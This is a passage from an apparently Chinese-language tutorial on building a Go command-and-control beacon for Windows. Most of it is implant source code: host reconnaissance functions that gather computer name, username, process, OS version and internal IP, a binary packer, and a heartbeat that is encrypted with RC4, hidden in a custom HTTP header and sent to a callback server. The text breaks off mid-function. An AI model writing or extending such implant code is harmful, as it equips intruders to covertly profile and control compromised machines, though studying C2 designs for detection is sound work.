class="line">		<span class="keyword">return</span> <span class="number">0</span>, errors.New(<span class="string">&quot;not found GetACP&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	acp, _, _ := fnGetACP.Call()</span><br><span class="line">	<span class="keyword">return</span> <span class="type">int32</span>(acp), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取计算机名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetComputerName</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	name, _ := os.Hostname()</span><br><span class="line">	<span class="keyword">return</span> name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取用户名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetUsername</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> u, err := user.Current(); err == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="comment">// Windows下user.Current().Username可能是&quot;DOMAIN\\User&quot;</span></span><br><span class="line">		parts := strings.Split(u.Username, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> parts[<span class="built_in">len</span>(parts)<span class="number">-1</span>]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前进程名</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetProcessName</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> filepath.Base(os.Args[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前进程PID</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetPid</span><span class="params">()</span></span> <span class="type">int16</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">int16</span>(os.Getpid())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetTID</span><span class="params">()</span></span> <span class="type">int16</span> &#123;</span><br><span class="line">	GetCurrentThreadId := Kernel32.NewProc(<span class="string">&quot;GetCurrentThreadId&quot;</span>)</span><br><span class="line">	tid, _, _ := GetCurrentThreadId.Call()</span><br><span class="line">	<span class="keyword">return</span> <span class="type">int16</span>(tid)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCodePageOEM</span><span class="params">()</span></span> (<span class="type">int32</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	procGetOEMCP := Kernel32.NewProc(<span class="string">&quot;GetOEMCP&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := procGetOEMCP.Find(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, errors.New(<span class="string">&quot;not found GetOEMCP&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	oemacp, _, _ := procGetOEMCP.Call()</span><br><span class="line">	<span class="keyword">return</span> <span class="type">int32</span>(oemacp), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetGmtOffset</span><span class="params">()</span></span> <span class="type">int32</span> &#123;</span><br><span class="line">	_, offset := time.Now().Zone()</span><br><span class="line">	<span class="comment">// offset 是相对于 UTC 的秒数</span></span><br><span class="line">	<span class="comment">// Windows Bias 是分钟，且正值代表西区（负时区），Go 的 offset 正值代表东区（正时区）</span></span><br><span class="line">	<span class="comment">// 所以这里直接用 offset/3600 得到小时数</span></span><br><span class="line">	<span class="keyword">return</span> <span class="type">int32</span>(offset / <span class="number">3600</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> OSVERSIONINFOEXW <span class="keyword">struct</span> &#123;</span><br><span class="line">	dwOSVersionInfoSize <span class="type">uint32</span></span><br><span class="line">	dwMajorVersion      <span class="type">uint32</span></span><br><span class="line">	dwMinorVersion      <span class="type">uint32</span></span><br><span class="line">	dwBuildNumber       <span class="type">uint32</span></span><br><span class="line">	dwPlatformId        <span class="type">uint32</span></span><br><span class="line">	szCSDVersion        [<span class="number">128</span>]<span class="type">uint16</span></span><br><span class="line">	wServicePackMajor   <span class="type">uint16</span></span><br><span class="line">	wServicePackMinor   <span class="type">uint16</span></span><br><span class="line">	wSuiteMask          <span class="type">uint16</span></span><br><span class="line">	wProductType        <span class="type">byte</span></span><br><span class="line">	wReserved           <span class="type">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getOSVersionInfo</span><span class="params">()</span></span> (*OSVERSIONINFOEXW, <span class="type">error</span>) &#123;</span><br><span class="line">	ntdll := syscall.NewLazyDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">	rtlGetVersion := ntdll.NewProc(<span class="string">&quot;RtlGetVersion&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> osvi OSVERSIONINFOEXW</span><br><span class="line">	osvi.dwOSVersionInfoSize = <span class="type">uint32</span>(unsafe.Sizeof(osvi))</span><br><span class="line"></span><br><span class="line">	ret, _, _ := rtlGetVersion.Call(<span class="type">uintptr</span>(unsafe.Pointer(&amp;osvi)))</span><br><span class="line">	<span class="keyword">if</span> ret != <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;RtlGetVersion failed: %d&quot;</span>, ret)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> &amp;osvi, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetWindowsMajorVersion</span><span class="params">()</span></span> (<span class="type">int8</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	osvi, err := getOSVersionInfo()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">int8</span>(osvi.dwMajorVersion), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetWindowsMinorVersion</span><span class="params">()</span></span> (<span class="type">int8</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	osvi, err := getOSVersionInfo()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">int8</span>(osvi.dwMinorVersion), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetWindowsBuildNumber</span><span class="params">()</span></span> (<span class="type">int32</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	osvi, err := getOSVersionInfo()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">int32</span>(osvi.dwBuildNumber), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>收集完系统信息后就要打包成心跳包，这里就有必要说一下打包器了，还有除了<strong>byteArray和String类型的数据</strong>部分之外，其余数据用<strong>大端序</strong>打包，什么是大端就不用我多少说了！</p>
<p>因为我们的Beacon是用Go语言写，所以就用一下它的一些特性，比如说<strong>类型断言</strong>，可以动态的获取数据类型。</p>
<ol>
<li>首先我们需要将所有需要打包的数据放入到 <code>[]interface&#123;&#125;</code> 切片中，这个数组可以装入任意类型的数据，<code>interface&#123;&#125;</code> 可以换成 <code>any</code>，效果是一样的，“协议长什么样”完全交给了<strong>顺序</strong>和<strong>值本身</strong></li>
<li>⚠<strong>特别注意</strong>：<code>[]byte</code> 类型需要自己打包长度，因为有些数据需要进行二次打包，如果在PackArray里打包长度会多次一个长度字段，且这个字段是多余的，不知道各位能否get到我的意思，一个实际的例子在下文的<code>5.1 任务创建</code>中会有体现</li>
<li>从切片中取出数据，然后用go的<strong>类型断言</strong>，获取数据类型，根据类型选择相应的打包方式</li>
</ol>
<p>比如说我要打包如下的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;int8(1),int16(0x12),int32(0x12345678),&quot;hello oneday!&quot;,[]byte(&quot;oneday&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>打包后的数据如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">01              // int8(1)</span><br><span class="line">00 12           // int16(0x12)</span><br><span class="line">12 34 56 78     // int32(0x12345678)</span><br><span class="line">00 00 00 0E     // 字符串长度（14 字节，含末尾 \x00）</span><br><span class="line">68 65 6C 6C 6F 20 6F 6E 65 64 61 79 21 00   // hello oneday!</span><br><span class="line">00 00 00 06     // []byte 长度（6 字节）</span><br><span class="line">6F 6E 65 64 61 79     // oneday</span><br></pre></td></tr></table></figure>

<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/31/20-01-22-62b19edb187ba3c9886381ac6a9cf63b-20250731200122-37a536.png"></p>
<p><strong>更通用的方式</strong>：就是自己根据值选择打包方式，比如说addByte、addShort、addInt、addString，addByteArray等，这也是大多数C2使用的方法。比如说havoc就是用这种方式打包：<a target="_blank" rel="noopener" href="https://github.com/HavocFramework/Havoc/blob/main/teamserver/pkg/common/packer/packer.go">Havoc&#x2F;teamserver&#x2F;pkg&#x2F;common&#x2F;packer&#x2F;packer.go at main · HavocFramework&#x2F;Havoc</a></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/31/11-17-45-69a1df7bdbee70b1c05e795749dc7a68-20250731111744-906271.png"></p>
<p><code>utils/packet/packer.go</code>：打包器的代码封装在这里了</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> packet</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PackBytes</span><span class="params">(b []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	buf := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">	binary.Write(buf, binary.BigEndian, <span class="type">uint32</span>(<span class="built_in">len</span>(b)))</span><br><span class="line">	buf.Write(b)</span><br><span class="line">	<span class="keyword">return</span> buf.Bytes()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PackArray</span><span class="params">(array []any)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> packData []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> array &#123;</span><br><span class="line">		<span class="keyword">switch</span> v := array[i].(<span class="keyword">type</span>) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> []<span class="type">byte</span>:</span><br><span class="line">			packData = <span class="built_in">append</span>(packData, v...)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">			size := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)</span><br><span class="line">			val := v</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(val) != <span class="number">0</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> !strings.HasSuffix(val, <span class="string">&quot;\x00&quot;</span>) &#123;</span><br><span class="line">					val += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			binary.BigEndian.PutUint32(size, <span class="type">uint32</span>(<span class="built_in">len</span>(val)))</span><br><span class="line">			packData = <span class="built_in">append</span>(packData, size...)</span><br><span class="line">			packData = <span class="built_in">append</span>(packData, []<span class="type">byte</span>(val)...)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="type">int8</span>:</span><br><span class="line">			packData = <span class="built_in">append</span>(packData, <span class="type">byte</span>(v))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="type">int16</span>:</span><br><span class="line">			num := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">2</span>)</span><br><span class="line">			binary.BigEndian.PutUint16(num, <span class="type">uint16</span>(v))</span><br><span class="line">			packData = <span class="built_in">append</span>(packData, num...)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="type">int32</span>:</span><br><span class="line">			num := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)</span><br><span class="line">			binary.BigEndian.PutUint32(num, <span class="type">uint32</span>(v))</span><br><span class="line">			packData = <span class="built_in">append</span>(packData, num...)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="type">int64</span>:</span><br><span class="line">			num := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)</span><br><span class="line">			binary.BigEndian.PutUint64(num, <span class="type">uint64</span>(v))</span><br><span class="line">			packData = <span class="built_in">append</span>(packData, num...)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="type">bool</span>:</span><br><span class="line">			<span class="keyword">var</span> bt <span class="type">byte</span> = <span class="number">0</span></span><br><span class="line">			<span class="keyword">if</span> v &#123;</span><br><span class="line">				bt = <span class="number">1</span></span><br><span class="line">			&#125;</span><br><span class="line">			packData = <span class="built_in">append</span>(packData, bt)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;PackArray unknown type&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> packData, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sysinfo/heartbeat.go</code>：包含心跳包HeartBeat结构体、InitHeartBeat和PackHeartBeat方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sysinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;Beacon/profile&quot;</span></span><br><span class="line">	<span class="string">&quot;Beacon/utils/packet&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HeartBeat <span class="keyword">struct</span> &#123;</span><br><span class="line">	BeaconID    <span class="type">uint32</span> <span class="comment">// rand id</span></span><br><span class="line">	BeaconName  <span class="type">string</span></span><br><span class="line">	Sleep       <span class="type">int32</span> <span class="comment">// 秒</span></span><br><span class="line">	Jitter      <span class="type">int32</span> <span class="comment">// 没有用到</span></span><br><span class="line">	KillDate    <span class="type">int32</span> <span class="comment">// 没有用到</span></span><br><span class="line">	WorkingTime <span class="type">int32</span> <span class="comment">// 没有用到</span></span><br><span class="line">	ACP         <span class="type">int32</span> <span class="comment">// ANSI code page</span></span><br><span class="line">	OemCP       <span class="type">int32</span> <span class="comment">// OEM code page</span></span><br><span class="line">	GmtOffset   <span class="type">int32</span> <span class="comment">// 分钟</span></span><br><span class="line">	Pid         <span class="type">int16</span></span><br><span class="line">	Tid         <span class="type">int16</span></span><br><span class="line">	BuildNumber <span class="type">int32</span></span><br><span class="line">	MajorVer    <span class="type">int8</span></span><br><span class="line">	MinorVer    <span class="type">int8</span></span><br><span class="line">	InternalIP  <span class="type">uint32</span> <span class="comment">// IPv4 转 uint32</span></span><br><span class="line">	Flag        <span class="type">int8</span>   <span class="comment">// 0b00000101</span></span><br><span class="line"></span><br><span class="line">	SessionKey []<span class="type">byte</span> <span class="comment">// 加解密任务包和结果包</span></span><br><span class="line"></span><br><span class="line">	Domain   []<span class="type">byte</span></span><br><span class="line">	Computer []<span class="type">byte</span></span><br><span class="line">	Username []<span class="type">byte</span></span><br><span class="line">	Process  []<span class="type">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ip2int</span><span class="params">(ip <span class="type">string</span>)</span></span> <span class="type">uint32</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> b [<span class="number">4</span>]<span class="type">byte</span></span><br><span class="line">	fmt.Sscanf(ip, <span class="string">&quot;%d.%d.%d.%d&quot;</span>, &amp;b[<span class="number">0</span>], &amp;b[<span class="number">1</span>], &amp;b[<span class="number">2</span>], &amp;b[<span class="number">3</span>])</span><br><span class="line">	<span class="keyword">return</span> binary.BigEndian.Uint32(b[:])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitHeartBeat</span><span class="params">()</span></span> HeartBeat &#123;</span><br><span class="line">	heartBeat := HeartBeat&#123;&#125;</span><br><span class="line">	<span class="comment">//heartBeat.BeaconID = rand.Uint32()</span></span><br><span class="line">	heartBeat.BeaconID = <span class="number">0x55667788</span></span><br><span class="line">	heartBeat.BeaconName = <span class="string">&quot;Beacon&quot;</span></span><br><span class="line">	heartBeat.Sleep = <span class="type">int32</span>(profile.BeaconProfile.Sleep)</span><br><span class="line">	heartBeat.Jitter = <span class="type">int32</span>(profile.BeaconProfile.Jitter)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//heartBeat.KillDate = profile.BeaconProfile.</span></span><br><span class="line">	heartBeat.KillDate = <span class="type">int32</span>(<span class="number">10</span>)</span><br><span class="line">	heartBeat.WorkingTime = <span class="type">int32</span>(<span class="number">0</span>)</span><br><span class="line">	acp, _ := GetCodePageANSI()</span><br><span class="line">	heartBeat.ACP = acp</span><br><span class="line">	oemcp, _ := GetCodePageOEM()</span><br><span class="line">	heartBeat.OemCP = oemcp</span><br><span class="line">	heartBeat.GmtOffset = GetGmtOffset()</span><br><span class="line">	heartBeat.Pid = GetPid()</span><br><span class="line">	heartBeat.Tid = GetTID()</span><br><span class="line">	buildNumber, _ := GetWindowsBuildNumber()</span><br><span class="line">	majorVersion, _ := GetWindowsMajorVersion()</span><br><span class="line">	minorVersion, _ := GetWindowsMinorVersion()</span><br><span class="line">	heartBeat.BuildNumber = buildNumber</span><br><span class="line">	heartBeat.MinorVer = minorVersion</span><br><span class="line">	heartBeat.MajorVer = majorVersion</span><br><span class="line">	heartBeat.InternalIP = ip2int(GetInternalIp())</span><br><span class="line">	heartBeat.Flag = <span class="type">int8</span>(<span class="number">0</span>b00000111) <span class="comment">// beacon.arch = x64,system.arch = x64,Elevated = true(管理员权限)</span></span><br><span class="line">	heartBeat.SessionKey = []<span class="type">byte</span>(<span class="string">&quot;01234567890123456789&quot;</span>)</span><br><span class="line">	heartBeat.Domain = []<span class="type">byte</span>(GetDomain())</span><br><span class="line">	heartBeat.Computer = []<span class="type">byte</span>(GetComputerName())</span><br><span class="line">	heartBeat.Username = []<span class="type">byte</span>(GetUsername())</span><br><span class="line">	heartBeat.Process = []<span class="type">byte</span>(GetProcessName())</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> heartBeat</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PackHeartBeat</span><span class="params">(heartBeat HeartBeat)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	<span class="comment">// 按顺序组织字段</span></span><br><span class="line">	fields := []<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">		<span class="type">int32</span>(heartBeat.BeaconID),              <span class="comment">// int32</span></span><br><span class="line">		heartBeat.BeaconName,                   <span class="comment">//string</span></span><br><span class="line">		heartBeat.Sleep,                        <span class="comment">// int32</span></span><br><span class="line">		heartBeat.Jitter,                       <span class="comment">// int32</span></span><br><span class="line">		heartBeat.KillDate,                     <span class="comment">// int32</span></span><br><span class="line">		heartBeat.WorkingTime,                  <span class="comment">// int32</span></span><br><span class="line">		heartBeat.ACP,                          <span class="comment">// int16</span></span><br><span class="line">		heartBeat.OemCP,                        <span class="comment">// int16</span></span><br><span class="line">		heartBeat.GmtOffset,                    <span class="comment">// int8</span></span><br><span class="line">		heartBeat.Pid,                          <span class="comment">// int16</span></span><br><span class="line">		heartBeat.Tid,                          <span class="comment">// int16</span></span><br><span class="line">		heartBeat.BuildNumber,                  <span class="comment">// int32</span></span><br><span class="line">		heartBeat.MajorVer,                     <span class="comment">// int32</span></span><br><span class="line">		heartBeat.MinorVer,                     <span class="comment">// int32</span></span><br><span class="line">		<span class="type">int32</span>(heartBeat.InternalIP),            <span class="comment">// int32</span></span><br><span class="line">		heartBeat.Flag,                         <span class="comment">// int8</span></span><br><span class="line">		packet.PackBytes(heartBeat.SessionKey), <span class="comment">// []byte</span></span><br><span class="line">		packet.PackBytes(heartBeat.Domain),     <span class="comment">// []byte</span></span><br><span class="line">		packet.PackBytes(heartBeat.Computer),   <span class="comment">// []byte</span></span><br><span class="line">		packet.PackBytes(heartBeat.Username),   <span class="comment">// []byte</span></span><br><span class="line">		packet.PackBytes(heartBeat.Process),    <span class="comment">// []byte</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 调用统一的打包器</span></span><br><span class="line">	data, err := packet.PackArray(fields)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>utils/common/http.go</code> 接下来就是把心跳数据RC4加密（第一把密钥）→Base64URL编码→塞进自定义HTTP头→发GET请求→把返回体用 <code>sessionKey</code> 密钥（第二把密钥）RC4 解密</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> common</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;Beacon/profile&quot;</span></span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HttpGet</span><span class="params">(metaData []<span class="type">byte</span>, sessionKey []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"></span><br><span class="line">	url := profile.BeaconProfile.CallbackAddresses[<span 